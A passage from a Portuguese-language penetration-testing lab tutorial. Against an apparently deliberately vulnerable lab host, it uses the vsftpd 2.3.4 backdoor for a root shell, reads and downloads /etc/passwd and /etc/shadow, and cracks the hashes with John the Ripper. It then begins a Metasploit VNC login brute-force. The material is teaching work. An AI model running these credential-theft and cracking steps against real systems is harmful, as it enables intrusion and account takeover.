</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 192.168.1.30:21 - UID: <span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found shell.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>2</span> opened <span class=o>(</span>172.18.18.105:35943 -&gt; 192.168.1.30:6200<span class=o>)</span> at 2024-08-11 17:08:34 -0300
</span></span></code></pre></td></tr></table></div></div><p>O exploit foi bem-sucedido. Agora, nós temos uma shell no sistema remoto como o usuário root e podemos explorar o sistema de arquivos do alvo. Por exemplo, veja o comando <code>dir</code> que lista as pastas do diretório atual (que é o <code>/</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bin    dev   initrd      lost+found  nohup.out  root  sys  var
</span></span><span class=line><span class=cl>boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz
</span></span><span class=line><span class=cl>cdrom  home  lib         mnt         proc       srv   usr
</span></span></code></pre></td></tr></table></div></div><p>Podemos também procurar e baixar arquivos sensíveis como /etc/passwd e /etc/shadow, que contêm informações sobre os usuários e suas senhas. Vamos listar o conteúdo desses arquivos com o comando GET:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GET /etc/passwd
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/bin/sh
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/bin/sh
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/bin/sh
</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/bin/sh
</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/bin/sh
</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/bin/sh
</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/bin/sh
</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/bin/sh
</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/bin/sh
</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/bin/sh
</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span></span><span class=line><span class=cl>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span></span><span class=line><span class=cl>dhcp:x:101:102::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>syslog:x:102:103::/home/syslog:/bin/false
</span></span><span class=line><span class=cl>klog:x:103:104::/home/klog:/bin/false
</span></span><span class=line><span class=cl>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
</span></span><span class=line><span class=cl>bind:x:105:113::/var/cache/bind:/bin/false
</span></span><span class=line><span class=cl>postfix:x:106:115::/var/spool/postfix:/bin/false
</span></span><span class=line><span class=cl>ftp:x:107:65534::/home/ftp:/bin/false
</span></span><span class=line><span class=cl>postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span></span><span class=line><span class=cl>mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
</span></span><span class=line><span class=cl>tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
</span></span><span class=line><span class=cl>distccd:x:111:65534::/:/bin/false
</span></span><span class=line><span class=cl>user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
</span></span><span class=line><span class=cl>service:x:1002:1002:,,,:/home/service:/bin/bash
</span></span><span class=line><span class=cl>telnetd:x:112:120::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>proftpd:x:113:65534::/var/run/proftpd:/bin/false
</span></span><span class=line><span class=cl>statd:x:114:65534::/var/lib/nfs:/bin/false
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GET /etc/shadow
</span></span><span class=line><span class=cl>root:<span class=nv>$1</span>$/avpfBJ1<span class=nv>$x0z8w5UF9Iv</span>./DR9E9Lid.:14747:0:99999:7:::
</span></span><span class=line><span class=cl>daemon:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>bin:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>sys:<span class=nv>$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0</span>:14742:0:99999:7:::
</span></span><span class=line><span class=cl>sync:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>games:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>man:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>lp:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>mail:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>news:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>uucp:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>proxy:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>www-data:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>backup:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>list:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>irc:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>gnats:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>nobody:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>libuuid:!:14684:0:99999:7:::
</span></span><span class=line><span class=cl>dhcp:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>syslog:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>klog:<span class=nv>$1$f2ZVMS4K$R9XkI</span>.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
</span></span><span class=line><span class=cl>sshd:*:14684:0:99999:7:::
</span></span><span class=line><span class=cl>msfadmin:<span class=nv>$1$XN10Zj2c$Rt</span>/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
</span></span><span class=line><span class=cl>bind:*:14685:0:99999:7:::
</span></span><span class=line><span class=cl>postfix:*:14685:0:99999:7:::
</span></span><span class=line><span class=cl>ftp:*:14685:0:99999:7:::
</span></span><span class=line><span class=cl>postgres:<span class=nv>$1$Rw35ik</span>.x<span class=nv>$MgQgZUuO5pAoUvfJhfcYe</span>/:14685:0:99999:7:::
</span></span><span class=line><span class=cl>mysql:!:14685:0:99999:7:::
</span></span><span class=line><span class=cl>tomcat55:*:14691:0:99999:7:::
</span></span><span class=line><span class=cl>distccd:*:14698:0:99999:7:::
</span></span><span class=line><span class=cl>user:<span class=nv>$1$HESu9xrH$k</span>.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
</span></span><span class=line><span class=cl>service:<span class=nv>$1$kR3ue7JZ$7</span>GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
</span></span><span class=line><span class=cl>telnetd:*:14715:0:99999:7:::
</span></span><span class=line><span class=cl>proftpd:!:14727:0:99999:7:::
</span></span><span class=line><span class=cl>statd:*:15474:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div><p>Em posse dessas informações, uma ideia seria utilizar o John the Ripper, uma ferramenta de cracking de senhas que pode processar e quebrar hashes de senhas. Ela tem a capacidade de unificar arquivos de senha e hash, como o /etc/passwd e /etc/shadow, e realizar ataques para descobrir as senhas originais.</p><p>Para unificar esses arquivos e preparar o ambiente para quebrar as senhas, vamos baixar os arquivos e salvá-los em meu diretório local <code>/tmp</code> no Kali.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>download /etc/passwd /tmp/passwd
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Download /etc/passwd <span class=o>=</span>&gt; /tmp/passwd
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Done
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>download /etc/shadow /tmp/shadow
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Download /etc/shadow <span class=o>=</span>&gt; /tmp/shadow
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Done
</span></span></code></pre></td></tr></table></div></div><p>Vamos voltar para o terminal padrão do Kali.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 192.168.1.30 - Command shell session <span class=m>2</span> closed.
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>unix/ftp/vsftpd_234_backdoor<span class=o>)</span> &gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 exploit<span class=o>(</span>unix/ftp/vsftpd_234_backdoor<span class=o>)</span> &gt; <span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>gbrods㉿Gabriel<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$
</span></span></code></pre></td></tr></table></div></div><p>Com os arquivos baixados, usamos o comando <code>unshadow</code> do John the Ripper para combinar os arquivos /etc/passwd e /etc/shadow em um único arquivo de hashes <code>unshadowed.txt</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ unshadow /tmp/passwd /tmp/shadow &gt; /tmp/unshadowed.txt
</span></span></code></pre></td></tr></table></div></div><p>O arquivo unificado fica desta forma:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /tmp/unshadowed.txt
</span></span><span class=line><span class=cl>root:<span class=nv>$1</span>$/avpfBJ1<span class=nv>$x0z8w5UF9Iv</span>./DR9E9Lid.:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:*:1:1:daemon:/usr/sbin:/bin/sh
</span></span><span class=line><span class=cl>bin:*:2:2:bin:/bin:/bin/sh
</span></span><span class=line><span class=cl>sys:<span class=nv>$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0</span>:3:3:sys:/dev:/bin/sh
</span></span><span class=line><span class=cl>sync:*:4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games:*:5:60:games:/usr/games:/bin/sh
</span></span><span class=line><span class=cl>man:*:6:12:man:/var/cache/man:/bin/sh
</span></span><span class=line><span class=cl>lp:*:7:7:lp:/var/spool/lpd:/bin/sh
</span></span><span class=line><span class=cl>mail:*:8:8:mail:/var/mail:/bin/sh
</span></span><span class=line><span class=cl>news:*:9:9:news:/var/spool/news:/bin/sh
</span></span><span class=line><span class=cl>uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
</span></span><span class=line><span class=cl>proxy:*:13:13:proxy:/bin:/bin/sh
</span></span><span class=line><span class=cl>www-data:*:33:33:www-data:/var/www:/bin/sh
</span></span><span class=line><span class=cl>backup:*:34:34:backup:/var/backups:/bin/sh
</span></span><span class=line><span class=cl>list:*:38:38:Mailing List Manager:/var/list:/bin/sh
</span></span><span class=line><span class=cl>irc:*:39:39:ircd:/var/run/ircd:/bin/sh
</span></span><span class=line><span class=cl>gnats:*:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/bin/sh
</span></span><span class=line><span class=cl>nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
</span></span><span class=line><span class=cl>libuuid:!:100:101::/var/lib/libuuid:/bin/sh
</span></span><span class=line><span class=cl>dhcp:*:101:102::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>syslog:*:102:103::/home/syslog:/bin/false
</span></span><span class=line><span class=cl>klog:<span class=nv>$1$f2ZVMS4K$R9XkI</span>.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
</span></span><span class=line><span class=cl>sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>msfadmin:<span class=nv>$1$XN10Zj2c$Rt</span>/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
</span></span><span class=line><span class=cl>bind:*:105:113::/var/cache/bind:/bin/false
</span></span><span class=line><span class=cl>postfix:*:106:115::/var/spool/postfix:/bin/false
</span></span><span class=line><span class=cl>ftp:*:107:65534::/home/ftp:/bin/false
</span></span><span class=line><span class=cl>postgres:<span class=nv>$1$Rw35ik</span>.x<span class=nv>$MgQgZUuO5pAoUvfJhfcYe</span>/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span></span><span class=line><span class=cl>mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
</span></span><span class=line><span class=cl>tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
</span></span><span class=line><span class=cl>distccd:*:111:65534::/:/bin/false
</span></span><span class=line><span class=cl>user:<span class=nv>$1$HESu9xrH$k</span>.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
</span></span><span class=line><span class=cl>service:<span class=nv>$1$kR3ue7JZ$7</span>GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
</span></span><span class=line><span class=cl>telnetd:*:112:120::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>proftpd:!:113:65534::/var/run/proftpd:/bin/false
</span></span><span class=line><span class=cl>statd:*:114:65534::/var/lib/nfs:/bin/false
</span></span></code></pre></td></tr></table></div></div><p>Finalmente, use o John the Ripper para quebrar as senhas no arquivo unificado. O formato de saída é: <code>senha (usuário)</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ john /tmp/unshadowed.txt
</span></span><span class=line><span class=cl>Warning: detected <span class=nb>hash</span> <span class=nb>type</span> <span class=s2>&#34;md5crypt&#34;</span>, but the string is also recognized as <span class=s2>&#34;md5crypt-long&#34;</span>
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--format=md5crypt-long&#34;</span> option to force loading these as that <span class=nb>type</span> instead
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>7</span> password hashes with <span class=m>7</span> different salts <span class=o>(</span>md5crypt, crypt<span class=o>(</span>3<span class=o>)</span> <span class=nv>$1</span>$ <span class=o>(</span>and variants<span class=o>)</span> <span class=o>[</span>MD5 256/256 AVX2 8x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>6</span> OpenMP threads
</span></span><span class=line><span class=cl>Proceeding with single, rules:Single
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>user             <span class=o>(</span>user<span class=o>)</span>
</span></span><span class=line><span class=cl>postgres         <span class=o>(</span>postgres<span class=o>)</span>
</span></span><span class=line><span class=cl>msfadmin         <span class=o>(</span>msfadmin<span class=o>)</span>
</span></span><span class=line><span class=cl>service          <span class=o>(</span>service<span class=o>)</span>
</span></span><span class=line><span class=cl>Almost <span class=k>done</span>: Processing the remaining buffered candidate passwords, <span class=k>if</span> any.
</span></span><span class=line><span class=cl>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span class=line><span class=cl><span class=m>123456789</span>        <span class=o>(</span>klog<span class=o>)</span>
</span></span><span class=line><span class=cl>batman           <span class=o>(</span>sys<span class=o>)</span>
</span></span><span class=line><span class=cl>Proceeding with incremental:ASCII
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>Depois que o comando terminar, podemos exibir os resultados da seguinte forma:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ john --show /tmp/unshadowed.txt
</span></span><span class=line><span class=cl>sys:batman:3:3:sys:/dev:/bin/sh
</span></span><span class=line><span class=cl>klog:123456789:103:104::/home/klog:/bin/false
</span></span><span class=line><span class=cl>msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
</span></span><span class=line><span class=cl>postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span></span><span class=line><span class=cl>user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
</span></span><span class=line><span class=cl>service:service:1002:1002:,,,:/home/service:/bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>6</span> password hashes cracked, <span class=m>1</span> left
</span></span></code></pre></td></tr></table></div></div><p>Ao utilizar a wordlist <code>password.lst</code>, não foram encontradas outras senhas além daquelas obtidas anteriormente.</p><h2 id=vnc-virtual-network-computing>VNC (Virtual Network Computing)<a hidden class=anchor aria-hidden=true href=#vnc-virtual-network-computing>#</a></h2><p>Relembrando da nossa enumeração inicial de portas, havia uma porta aberta referente ao serviço VNC. Veja:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ nmap -sV 192.168.1.30 -p <span class=m>5900</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-08-11 18:52 -03
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.1.30
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0017s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>5900/tcp open  vnc     VNC <span class=o>(</span>protocol 3.3<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.22 seconds
</span></span></code></pre></td></tr></table></div></div><p><em>Observação: a flag <code>-sV</code> habilita a detecção de serviço, retornando informações sobre suas versões.</em></p><p>O VNC é um protocolo para controle remoto de desktops, e pode ser uma porta de entrada para obter acesso gráfico ao sistema. A seguir, vamos utilizar o Metasploit para tentar autenticar no serviço VNC.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfconsole
</span></span></code></pre></td></tr></table></div></div><p>Busque pelo módulo que testa credenciais de login para o VNC.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; search vnc_login
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                             Disclosure Date  Rank    Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                             ---------------  ----    -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  auxiliary/scanner/vnc/vnc_login  .                normal  No     VNC Authentication Scanner
</span></span></code></pre></td></tr></table></div></div><p>Selecionamos o módulo para escaneamento de login do VNC.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use auxiliary/scanner/vnc/vnc_login
</span></span></code></pre></td></tr></table></div></div><p>Cada módulo do Metasploit possui campos obrigatórios e opcionais. Os campos obrigatórios são essenciais para a execução do módulo, enquanto os campos opcionais podem ser configurados para personalizar a execução ou otimizar o processo de exploração. Para ver esss campos, utilize o seguinte comando:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/vnc/vnc_login<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>auxiliary/scanner/vnc/vnc_login<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name              Current Setting                  Required  Description
</span></span><span class=line><span class=cl>   ----              ---------------                  --------  -----------
</span></span><span class=line><span class=cl>   ANONYMOUS_LOGIN   <span class=nb>false</span>                            yes       Attempt to login with a blank username and password
</span></span><span class=line><span class=cl>   BLANK_PASSWORDS   <span class=nb>false</span>                            no        Try blank passwords <span class=k>for</span> all users
</span></span><span class=line><span class=cl>   BRUTEFORCE_SPEED  <span class=m>5</span>                                yes       How fast to bruteforce, from <span class=m>0</span> to <span class=m>5</span>
</span></span><span class=line><span class=cl>   DB_ALL_CREDS      <span class=nb>false</span>                            no        Try each user/password couple stored in the current da
</span></span><span class=line><span class=cl>                                                                tabase
</span></span><span class=line><span class=cl>   DB_ALL_PASS       <span class=nb>false</span>                            no        Add all passwords in the current database to the list
</span></span><span class=line><span class=cl>   DB_ALL_USERS      <span class=nb>false</span>                            no        Add all users in the current database to the list
</span></span><span class=line><span class=cl>   DB_SKIP_EXISTING  none                             no        Skip existing credentials stored in the current databa
</span></span><span class=line><span class=cl>                                                                se <span class=o>(</span>Accepted: none, user, user<span class=p>&amp;</span>realm<span class=o>)</span>
</span></span><span class=line><span class=cl>   PASSWORD                                           no        The password to <span class=nb>test</span>
</span></span><span class=line><span class=cl>   PASS_FILE         /usr/share/metasploit-framework  no        File containing passwords, one per line
</span></span><span class=line><span class=cl>                     /data/wordlists/vnc_passwords.t
</span></span><span class=line><span class=cl>                     xt
</span></span><span class=line><span class=cl>   Proxies                                            no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:port
</span></span><span class=line><span class=cl>                                                                <span class=o>][</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>   RHOSTS                                             yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com/do
</span></span><span class=line><span class=cl>                                                                cs/using-metasploit/basics/using-metasploit.html
